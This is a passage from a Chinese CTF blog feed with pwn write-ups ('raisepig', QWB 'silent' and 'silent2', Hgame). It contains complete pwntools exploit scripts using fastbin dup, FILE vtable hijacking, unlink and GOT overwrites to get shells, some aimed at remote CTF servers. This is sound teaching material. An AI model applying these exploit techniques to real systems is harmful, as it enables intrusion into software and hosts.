class="line">0x7f23b5af6650 &lt;_IO_2_1_stdout_+48&gt;:0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6660 &lt;_IO_2_1_stdout_+64&gt;:0x7f23b5af66a4 &lt;_IO_2_1_stdout_+132&gt;0x0</span><br><span class="line">0x7f23b5af6670 &lt;_IO_2_1_stdout_+80&gt;:0x00x0</span><br><span class="line">0x7f23b5af6680 &lt;_IO_2_1_stdout_+96&gt;:0x00x7f23b5af58e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line">0x7f23b5af6690 &lt;_IO_2_1_stdout_+112&gt;:0x10xffffffffffffffff</span><br><span class="line">0x7f23b5af66a0 &lt;_IO_2_1_stdout_+128&gt;:0xa0000000x7f23b5af7780 &lt;_IO_stdfile_1_lock&gt;</span><br><span class="line">0x7f23b5af66b0 &lt;_IO_2_1_stdout_+144&gt;:0xffffffffffffffff0x0</span><br><span class="line">0x7f23b5af66c0 &lt;_IO_2_1_stdout_+160&gt;:0x7f23b5af57a0 &lt;_IO_wide_data_1&gt;0x0</span><br><span class="line">0x7f23b5af66d0 &lt;_IO_2_1_stdout_+176&gt;:0x00x0</span><br><span class="line">0x7f23b5af66e0 &lt;_IO_2_1_stdout_+192&gt;:0xffffffff0x0</span><br><span class="line">0x7f23b5af66f0 &lt;_IO_2_1_stdout_+208&gt;:0x00x7f23b5af46e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">0x7f23b5af6700 &lt;stderr&gt;:0x7f23b5af6540 &lt;_IO_2_1_stderr_&gt;0x7f23b5af6620 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">0x7f23b5af6710 &lt;stdin&gt;:0x7f23b5af58e0 &lt;_IO_2_1_stdin_&gt;0x7f23b5751b70 &lt;__gcc_personality_v0&gt;</span><br></pre></td></tr></table></figure></p><p>很好彩，在<code>_IO_2_1_stdout_+0x9d</code>处有可利用位置</p><p><code>IO_jump_t</code>中保存了一些函数指针，标准IO函数中会调用这些函数指针：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void * funcs[] = &#123;</span><br><span class="line">   1 NULL, // &quot;extra word&quot;</span><br><span class="line">   2 NULL, // DUMMY</span><br><span class="line">   3 exit, // finish</span><br><span class="line">   4 NULL, // overflow</span><br><span class="line">   5 NULL, // underflow</span><br><span class="line">   6 NULL, // uflow</span><br><span class="line">   7 NULL, // pbackfail</span><br><span class="line">   8 NULL, // xsputn  #printf</span><br><span class="line">   9 NULL, // xsgetn</span><br><span class="line">   10 NULL, // seekoff</span><br><span class="line">   11 NULL, // seekpos</span><br><span class="line">   12 NULL, // setbuf</span><br><span class="line">   13 NULL, // sync</span><br><span class="line">   14 NULL, // doallocate</span><br><span class="line">   15 NULL, // read</span><br><span class="line">   16 NULL, // write</span><br><span class="line">   17 NULL, // seek</span><br><span class="line">   18 pwn,  // close</span><br><span class="line">   19 NULL, // stat</span><br><span class="line">   20 NULL, // showmanyc</span><br><span class="line">   21 NULL, // imbue</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><code>printf</code>是通过<code>_IO_file_xsputn</code>实现的，<code>fake_vtable[7]</code>放入one_gadget，调用<code>printf</code>的时候就可以getshell。下面开始构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x7f23b5af6620+0x9d+3</span><br><span class="line">0x7f23b5af66c0 &lt;_IO_2_1_stdout_+160&gt;:0x00007f23b5af57a00x0000000000000000</span><br><span class="line">0x7f23b5af66d0 &lt;_IO_2_1_stdout_+176&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f23b5af66e0 &lt;_IO_2_1_stdout_+192&gt;:0x00000000ffffffff0x0000000000000000</span><br><span class="line">0x7f23b5af66f0 &lt;_IO_2_1_stdout_+208&gt;:0x00000000000000000x00007f23b5af46e0 --&gt; vtable</span><br></pre></td></tr></table></figure></p><p>构造如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*3 + p64(0)*2 + p64(0xffffffff) + p64(0)*2 + p64(fake_vtable)</span><br></pre></td></tr></table></figure></p><p>由于没有泄露heap地址，直接利用本次写入one gadget到<code>&lt;_IO_2_1_stdout_+208&gt;</code>，那么<code>fake_vtable</code>地址为<code>&lt;_IO_2_1_stdout_+208-7*8&gt;</code></p><p>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./raisepig2&apos;)</span><br><span class="line">elf = ELF(&apos;./raisepig2&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def z(a=&apos;&apos;):</span><br><span class="line">gdb.attach(p,a)</span><br><span class="line">if a == &apos;&apos;:</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">def add(namelen,name,pigtype,shell=0):</span><br><span class="line">p.sendlineafter(&apos;Your choice : &apos;,&apos;1&apos;)</span><br><span class="line">p.sendlineafter(&apos;Length of the name :&apos;,str(namelen))</span><br><span class="line">p.sendafter(&apos;The name of pig :&apos;,name)</span><br><span class="line">if shell == 0:</span><br><span class="line">p.sendlineafter(&apos;The type of the pig :&apos;,pigtype)</span><br><span class="line"></span><br><span class="line">def visit():</span><br><span class="line">p.sendlineafter(&apos;Your choice : &apos;,&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">def eat(idx):</span><br><span class="line">p.sendlineafter(&apos;Your choice : &apos;,&apos;3&apos;)</span><br><span class="line">p.sendlineafter(&apos;Which pig do you want to eat:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def eat_all():</span><br><span class="line">p.sendlineafter(&apos;Your choice : &apos;,&apos;4&apos;)</span><br><span class="line"></span><br><span class="line"># leak libc addr</span><br><span class="line">add(0x100,&apos;0&apos;,&apos;0&apos;)</span><br><span class="line">add(0x28,&apos;1&apos;,&apos;1&apos;)</span><br><span class="line">eat(0)</span><br><span class="line">eat(1)</span><br><span class="line">add(0x100,&apos;2&apos;*8,&apos;2&apos;)</span><br><span class="line">visit()</span><br><span class="line">p.recvuntil(&apos;22222222&apos;)</span><br><span class="line">libc.address = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8,&apos;\x00&apos;)) - 0x3c4b20 - 88</span><br><span class="line">success(&apos;0x%x&apos; % libc.address)</span><br><span class="line">success(&apos;0x%x&apos; % libc.symbols[&apos;_IO_2_1_stdout_&apos;])</span><br><span class="line"></span><br><span class="line"># fastbin attack</span><br><span class="line">add(0x60,&apos;3&apos;,&apos;3&apos;)</span><br><span class="line">add(0x60,&apos;4&apos;,&apos;4&apos;)</span><br><span class="line">eat(3)</span><br><span class="line">eat(4)</span><br><span class="line">eat(3)</span><br><span class="line"></span><br><span class="line">add(0x60,p64(libc.symbols[&apos;_IO_2_1_stdout_&apos;]+0x9d),&apos;5&apos;)</span><br><span class="line">#add(0x60,p64(libc.symbols[&quot;__malloc_hook&quot;]-0x23),&apos;5&apos;)</span><br><span class="line">add(0x60,&apos;6&apos;,&apos;6&apos;)</span><br><span class="line">add(0x60,&apos;7&apos;,&apos;7&apos;)</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + 0x4526a</span><br><span class="line"></span><br><span class="line">payload = &quot;\x00&quot;*3</span><br><span class="line">payload += 2*p64(0)</span><br><span class="line">payload += p64(0xffffffff)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">payload += p64(libc.symbols[&apos;_IO_2_1_stdout_&apos;]+0x98)</span><br><span class="line">add(0x60,payload,&apos;8&apos;,1)</span><br><span class="line"></span><br><span class="line">#add(0x60,&apos;a&apos;*0x13+p64(one_gadget),&apos;8&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;raisepig&quot;&gt;&lt;a href=&quot;#raisepig&quot; class=&quot;headerlink&quot; title=&quot;raisepig&quot;&gt;&lt;/a&gt;raisepig&lt;/h3&gt;&lt;p&gt;跟pwnable.tw的Secret Garden非常似。菜单有5个选项：&lt;br&gt;&lt;figu
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>qwb-pwn-silent1&amp;2</title>
    <link href="http://yoursite.com/2018/04/04/qwb-pwn-silent1&amp;2/"/>
    <id>http://yoursite.com/2018/04/04/qwb-pwn-silent1&amp;2/</id>
    <published>2018-04-04T03:04:57.000Z</published>
    <updated>2018-04-12T08:33:41.834Z</updated>
    
    <content type="html"><![CDATA[<p>好菜，只做了一题，慢慢补~</p><h3 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h3><p>程序有3个功能，分别是add，delete和edit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">add_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%lu"</span>, &amp;size);</span><br><span class="line">  getchar();</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  read_(v3, size);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt;= <span class="number">9</span> &amp;&amp; s[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  s[i] = (<span class="keyword">char</span> *)v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在add中可以控制malloc的大小。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">free_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="built_in">free</span>(s[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>free之后没有清空指针，可以进行fastbin dup修改got，在0x601ffa处发现满足size条件，要求fastbin大小为0x60，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">remote_addr = <span class="string">'39.107.32.132'</span></span><br><span class="line">remote_port = <span class="number">10000</span></span><br><span class="line">p = remote(remote_addr,remote_port)</span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line"></span><br><span class="line">add(<span class="number">80</span>,<span class="string">'a'</span>*<span class="number">79</span>)</span><br><span class="line">add(<span class="number">80</span>,<span class="string">'b'</span>*<span class="number">79</span>)</span><br><span class="line">add(<span class="number">80</span>,<span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">79</span>,<span class="string">'\x01'</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#a</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#b-&gt;a</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#a-&gt;b-&gt;a</span></span><br><span class="line"></span><br><span class="line">fake_addr = <span class="number">0x601ffa</span></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">payload = p64(fake_addr).ljust(<span class="number">79</span>,<span class="string">'\x01'</span>)</span><br><span class="line">add(<span class="number">80</span>,payload) <span class="comment">#a</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">80</span>,<span class="string">'d'</span>*<span class="number">79</span>) <span class="comment">#b</span></span><br><span class="line">add(<span class="number">80</span>,<span class="string">'e'</span>*<span class="number">79</span>) <span class="comment">#a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'$0'</span>+<span class="string">'\x00'</span>*<span class="number">12</span>+p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">80</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#delete(6)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>方法二：这里要用到edit的功能<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">edit_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(s[v1]);</span><br><span class="line">  read_(s[v1], v2 + <span class="number">1</span>);</span><br><span class="line">  read_(&amp;unk_602120, <span class="number">48L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路是：通过edit修改fastbin中的fd，然后修改ID=0的地址，进行任意地址写。</p><p>脚本如下：(不加sleep，不保证每次都成功)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,content,content2)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line">p.send(content)</span><br><span class="line">p.send(content2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#a</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#b-&gt;a</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x60209d</span>),<span class="string">'\n'</span>) <span class="comment">#修改a的fd</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'c'</span>*<span class="number">0x5f</span>) <span class="comment">#a</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(<span class="number">0x602018</span>)) <span class="comment">#修改ID=0的地址为free@got</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x400730</span>),<span class="string">'\n'</span>) <span class="comment">#改成system@plt</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="silent2"><a href="#silent2" class="headerlink" title="silent2"></a>silent2</h3><p>大体跟1差不多，不过这里add限制了大小，只能0x10或大于0x80，那么可以利用unsorted bins进行unlink<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">add_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">0x10</span> &amp;&amp; size &lt;= <span class="number">0x7F</span> ) <span class="comment">//这里改了</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路是：先申请两个0x100大小的chunk，然后free掉，再申请一个0x210的chunk，就会利旧刚刚free出来那两个chunk的空间，使用edit构造两个fake chunk(fake chunk1是free chunk，fake chunk2是allocated chunk)</p><p>再次delete(4)的时候，会触发unlink，最终结果是<code>p_addr</code>位置的地址就会改写是<code>&amp;p_addr-0x18</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,content,content2)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line">p.send(content)</span><br><span class="line">p.send(content2)</span><br><span class="line"></span><br><span class="line">list_addr = <span class="number">0x6020C0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'BBBB'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'CCCC'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'DDDD'</span>) <span class="comment">#3 &lt;-</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'EEEE'</span>) <span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(list_addr+<span class="number">0x18</span><span class="number">-0x18</span>)+p64(list_addr+<span class="number">0x18</span><span class="number">-0x10</span>)+<span class="string">'A'</span>*(<span class="number">0x100</span><span class="number">-0x20</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x210</span><span class="number">-0x100</span>) <span class="comment"># fake chunk</span></span><br><span class="line">add(<span class="number">0x210</span>, payload) <span class="comment">#5 == 3+4</span></span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># double free</span></span><br><span class="line">edit(<span class="number">3</span>,p64(elf.got[<span class="string">'free'</span>]),<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">'system'</span>]),<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好菜，只做了一题，慢慢补~&lt;/p&gt;
&lt;h3 id=&quot;silent&quot;&gt;&lt;a href=&quot;#silent&quot; class=&quot;headerlink&quot; title=&quot;silent&quot;&gt;&lt;/a&gt;silent&lt;/h3&gt;&lt;p&gt;程序有3个功能，分别是add，delete和edit&lt;/p&gt;
&lt;f
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hgame pwn</title>
    <link href="http://yoursite.com/2018/02/07/Hgame-pwn/"/>
    <id>http://yoursite.com/2018/02/07/Hgame-pwn/</id>
    <published>2018-02-07T05:07:14.000Z</published>
    <updated>2018-03-19T01:26:43.993Z</updated>
    
    <content type="html"><![CDATA[<p>终于补完了Hgame的pwn，学到很多新姿势。</p><h3 id="guess-number"><a href="#guess-number" class="headerlink" title="guess_number"></a>guess_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"enter your guess:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;nptr);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"OHHHHHHH! u did it !\norz orz orz orz\nhere is your flag:"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>虽然开了canary，但是只要输入的东西覆盖到随机数，判断一样就cat flag了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ distance  0xffffd39c 0xffffd4b0</span><br><span class="line">From 0xffffd39c to 0xffffd4b0: 276 bytes, 69 dwords</span><br></pre></td></tr></table></figure></p><p>计算一下输入位置和随机数的距离，输入一堆’1’，<code>atoi</code>会将输入转成0x7fffffff。那么payload：<code>python -c &quot;from pwn import *;print &#39;1&#39;*276+p32(0x7fffffff)&quot; |nc 111.230.149.72 10002</code></p><h3 id="flag-server"><a href="#flag-server" class="headerlink" title="flag_server"></a>flag_server</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"your username length: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, 